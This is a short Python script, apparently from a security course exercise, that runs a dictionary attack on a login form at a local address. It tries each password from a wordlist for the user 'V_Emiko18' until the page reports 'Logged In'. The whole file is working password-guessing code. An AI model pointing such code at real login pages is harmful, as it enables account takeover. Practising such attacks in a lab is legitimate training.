import requests

url = 'http://127.0.0.1:8000/'

def read_passwords():
    with open("Q2dictionary.txt", 'r', encoding="utf8") as f:
        pas = []
        for line in f:
            pas.append(line.strip())
            
    return pas

passwords = read_passwords()

for password in passwords:
    session = requests.session()
    res = requests.post(url, {'username':'V_Emiko18', 'password': password, 'submit': 'submit'} )
    if ("Logged In" in res.text):
        print(password)
        break